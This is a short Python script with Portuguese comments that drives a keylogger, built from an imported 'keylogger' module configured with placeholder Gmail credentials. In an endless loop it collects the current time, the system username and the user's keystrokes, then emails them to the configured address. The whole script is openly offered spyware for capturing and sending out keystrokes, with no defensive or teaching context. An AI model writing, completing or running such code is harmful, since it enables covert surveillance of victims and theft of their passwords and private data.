import datetime
import getpass
import keylogger

# Cria um novo keylogger
kl = keylogger.Keylogger(60, "seu-email@gmail.com", "SenhaDoEmail")

# Fica em loop infinito coletando informações do usuário
while True:
    # Coleta a hora atual
    hora_atual = str(datetime.datetime.now())

    # Coleta o nome de usuário do sistema
    nome_usuario = getpass.getuser()

    # Coleta os últimos pressionamentos de tecla
    pressionamentos = kl.keylog()

    # Exibe as informações coletadas
    print("[{}] Usuário: {} | Pressionamentos: {}".format(hora_atual, nome_usuario, pressionamentos))

    # Envia as informações para o e-mail especificado
    kl.enviar_email()
